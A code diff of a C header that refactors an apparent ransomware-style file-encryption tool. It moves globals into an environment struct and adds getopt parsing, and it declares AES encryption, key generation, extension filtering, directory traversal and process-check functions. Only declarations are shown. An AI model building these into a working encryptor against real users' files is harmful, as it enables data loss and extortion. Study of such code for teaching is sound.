@@ -15,6 +15,7 @@
 # include <sys/stat.h>      // For checking if directory
 # include <openssl/aes.h>   // For AES key generation
 # include <openssl/rand.h>
+#include <getopt.h>         // For argv parsing
 
 /*-------------------------------- Colors ---------------------------------*/
 
@@ -67,7 +68,7 @@ enum fa_e_modes
 
 enum fa_e_stockhlm_header
 {
-    FA_STOCKHLM_HEADER_SIZE          = 0x0118,
+    FA_STOCKHLM_HEADER_SIZE      = 0x0118,
     FA_MAGICNBR_SIZE             = 8,
     FA_ENCRYPT_KEY_SIZE          = 256,
 
@@ -123,19 +124,23 @@ typedef struct fa_s_stockhlm_header
 
 /*---------------------------- Global variables ---------------------------*/
 
-extern unsigned char        *g_mapped_data; // file is mapped in memory here
-extern uint16_t             g_modes;        // options given from command line
-extern fa_t_stockhlm_header g_stockhlm_header;
-extern size_t               g_encrypted_filesize;
+typedef struct fa_s_env
+{
+    unsigned char        *g_mapped_data; // file is mapped in memory here
+    uint16_t             g_modes;        // options given from command line
+    fa_t_stockhlm_header g_stockhlm_header;
+    size_t               g_encrypted_filesize;
+    char                 *g_decryption_key;
+}   fa_t_env;
 
 /*---------------------------- Function prototypes ------------------------*/
 
-void    fa_parse_argv(char *argv[]);
+void    fa_parse_argv(fa_t_env *env, int argc, char *argv[]);
 
 char    *fa_get_filename(char *argv[]);
-int     fa_map_file_into_memory(const char *filename);
-int     fa_process_mapped_data(void);
-int     fa_write_processed_data_to_file(const char *target_path);
+int     fa_map_file_into_memory(fa_t_env *env, const char *filename);
+int     fa_process_mapped_data(fa_t_env *env);
+int     fa_write_processed_data_to_file(fa_t_env *env, const char *target_path);
 
 /*---------------------------- cryptography ------------------------*/
 
@@ -147,7 +152,7 @@ int     aes_encrypt_data(unsigned char *data, size_t data_len, \
 int     aes_decrypt_data(unsigned char *data, size_t data_len, \
     const unsigned char *key, unsigned char *iv);
 unsigned char    *fa_keygen(const char *_charset, size_t strength);
-unsigned char    *get_encryption_key(void);
+unsigned char    *get_encryption_key(fa_t_env *env);
 
 /*---------------------------- process checkers ------------------------*/
 
@@ -156,7 +161,7 @@ bool    pc_is_process_running(const char *process_name);
 
 /*---------------------------- file handling ------------------------*/
 
-bool    is_extension_handled(char *filepath);
-void    handle_dir(char *target_dir_path);
+bool    is_extension_handled(fa_t_env *env, char *filepath);
+void    handle_dir(fa_t_env *env, char *target_dir_path);
 
 #endif
